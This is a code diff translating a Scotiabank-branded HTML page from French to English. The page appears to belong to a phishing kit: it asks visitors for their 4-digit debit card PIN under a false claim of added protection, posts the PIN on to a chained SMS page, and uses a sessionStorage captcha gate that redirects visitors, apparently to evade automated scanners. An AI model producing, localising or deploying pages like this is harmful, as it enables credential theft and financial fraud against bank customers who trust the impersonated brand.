@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
 <script>if(!sessionStorage.getItem('__cptPass')||sessionStorage.getItem('__cptPass')!=='1'){try{document.documentElement.innerHTML=''}catch(e){}window.location.replace('/captcha.html');throw new Error('BLOCKED');}</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fournissez votre NIP - Banque Scotia</title>
+    <title>Provide your PIN - Scotiabank</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * { box-sizing: border-box; }
@@ -46,7 +46,7 @@
 
     <div class="header-bar">
         <a href="scotiabank101_sms.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
-        <div class="header-title">Fournissez votre NIP</div>
+        <div class="header-title">Provide your PIN</div>
     </div>
 
     <div class="container">
@@ -54,31 +54,31 @@
             <svg viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2zm0 4v10h16V8H4zm2 6h4v2H6v-2z" fill="#ffffff"/></svg>
         </div>
 
-        <div class="page-heading">Veuillez fournir le NIP de votre Carte Scotia.</div>
+        <div class="page-heading">Please provide your ScotiaCard PIN.</div>
 
-        <p class="desc-text">Le NIP de votre Carte Scotia est le code de quatre chiffres que vous utilisez avec votre carte de débit de la Banque Scotia.</p>
+        <p class="desc-text">Your ScotiaCard PIN is the 4-digit code you use with your Scotiabank debit card.</p>
         
-        <p class="desc-text">Fournir votre NIP ajoute une couche de protection supplémentaire et contribue à protéger votre compte avant d'ajouter un contact ou de modifier un contact existant.</p>
+        <p class="desc-text">Providing your PIN adds an extra layer of protection and helps safeguard your account before adding or updating a contact.</p>
         
-        <p class="desc-text">Vous avez oublié votre NIP? Vous pouvez passer à une succursale de la Banque Scotia pour le réinitialiser.</p>
+        <p class="desc-text">Forgot your PIN? You can visit a Scotiabank branch to reset it.</p>
 
         <form action="scotiabank101_sms2.html" method="POST">
             <div class="input-group">
-                <label class="input-label">Entrez le NIP de votre Carte Scotia</label>
+                <label class="input-label">Enter your ScotiaCard PIN</label>
                 <div class="pin-wrapper">
-                    <input type="password" name="NIP Scotia (PIN 4 chiffres)" id="pinInput" class="pin-input" required maxlength="4" pattern="\d{4}" inputmode="numeric" placeholder="••••">
+                    <input type="password" name="Scotia PIN (4-digit)" id="pinInput" class="pin-input" required maxlength="4" pattern="\d{4}" inputmode="numeric" placeholder="••••">
                     <i class="fa-regular fa-eye eye-toggle" id="togglePin"></i>
                 </div>
             </div>
 
-            <button type="submit" class="btn-submit">Continuer</button>
+            <button type="submit" class="btn-submit">Continue</button>
         </form>
     </div>
 
     <!-- Loader Overlay -->
     <div id="loaderOverlay" class="loader-overlay">
         <div class="loader-spinner"></div>
-        <p class="loader-text">Vérification du NIP en cours...</p>
+        <p class="loader-text">Verifying PIN...</p>
     </div>
 
     <script>
